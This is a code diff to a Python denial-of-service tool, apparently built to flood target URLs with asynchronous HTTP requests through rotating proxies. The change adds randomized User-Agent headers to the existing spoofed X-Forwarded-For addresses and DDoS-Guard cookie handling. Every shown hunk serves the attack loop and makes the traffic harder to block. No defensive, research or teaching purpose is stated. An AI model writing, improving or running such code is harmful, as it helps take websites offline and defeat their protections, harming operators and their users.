@@ -26,11 +26,13 @@ from datetime import datetime, timedelta
 import ddos_guard
 from commons import config_logger, set_limits, load_proxies, Proxy
 
+from fake_useragent import UserAgent
+
 STATS = defaultdict(int)
 URL_ERRORS_COUNT = defaultdict(int)
 URL_STATUS_STATS = defaultdict(lambda: defaultdict(int))
 DDOS_GUARD_COOKIE_CACHE = TTLCache(maxsize=100, ttl=timedelta(hours=1), timer=datetime.now) # 3h is min __ddg5 lifetime, __ddg2 lives 1 year
-
+UA_FALLBACK = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
 
 async def make_request(url: str, proxy: Proxy, timeout: int, headers: Dict[str, str], ignore_response: bool):
     timeout = aiohttp.ClientTimeout(total=timeout)
@@ -87,13 +89,12 @@ def prepare_url(url: str, with_random_get_param: bool):
 
 
 def make_headers(
-        user_agent: str, random_xff_ip: bool, custom_headers: Dict[str, str],  target_headers: List[Tuple[str, str]]
+        user_agent: str, random_xff_ip: bool, custom_headers: Dict[str, str], target_headers: List[Tuple[str, str]], ua: UserAgent
 ) -> Dict[str, str]:
     headers = {}
-    if user_agent:
-        headers['user-agent'] = user_agent
+    headers['User-Agent'] = user_agent if user_agent else ua.random
     if random_xff_ip:
-        headers['x-forwarded-for'] = f'{randint(10, 250)}.{randint(0, 255)}.{randint(00, 254)}.{randint(1, 250)}'
+        headers['X-Forwarded-For'] = f'{randint(10, 250)}.{randint(0, 255)}.{randint(00, 254)}.{randint(1, 250)}'
     if custom_headers:
         headers.update(custom_headers)
     if target_headers:
@@ -110,7 +111,7 @@ def split_target(target: str):
 async def ddos(
         target: str, timeout: int, count: int, proxy_iterator: Iterable[Proxy],
         with_random_get_param: bool, user_agent: str, ignore_response: bool, random_xff_ip: bool,
-        custom_headers: Dict[str, str], stop_attack: int
+        custom_headers: Dict[str, str], ua: UserAgent, stop_attack: int
 ):
     target_url, target_headers = split_target(target)
     step = 0
@@ -121,7 +122,7 @@ async def ddos(
             break
         step += 1
         proxy = get_proxy(proxy_iterator)
-        headers = make_headers(user_agent, random_xff_ip, custom_headers, target_headers)
+        headers = make_headers(user_agent, random_xff_ip, custom_headers, target_headers, ua)
         await make_request(prepare_url(target_url, with_random_get_param), proxy, timeout, headers, ignore_response)
         log_stats()
 
@@ -135,7 +136,7 @@ def log_stats():
 async def amain(
         targets: List[str], timeout: int, concurrency: int, count: int, proxies: List[Proxy],
         with_random_get_param: bool, user_agent: str, ignore_response: bool, random_xff_ip: bool,
-        custom_headers: Dict[str, str], stop_attack: int
+        custom_headers: Dict[str, str], ua: UserAgent, stop_attack: int
 ):
     coroutines = []
     proxy_iterator = cycle(proxies or [])
@@ -144,7 +145,7 @@ async def amain(
             coroutines.append(
                 ddos(target, timeout, count, proxy_iterator, with_random_get_param, user_agent, ignore_response,
                      random_xff_ip,
-                     custom_headers, stop_attack)
+                     custom_headers, ua, stop_attack)
             )
     await asyncio.gather(*coroutines)
 
@@ -177,6 +178,7 @@ def process(
     proxies = load_proxies(proxy_file, proxy_url, shuffle=shuffle_proxy, custom_format=proxy_custom_format)
     targets = load_targets(target_urls_file)
     targets.extend(target_url)
+    ua = UserAgent(fallback = UA_FALLBACK)
     loop = asyncio.get_event_loop()
     loop.run_until_complete(
         amain(targets,
@@ -189,6 +191,7 @@ def process(
               ignore_response,
               random_xff_ip,
               custom_headers,
+              ua,
               stop_attack)
     )
     for key, value in STATS.items():
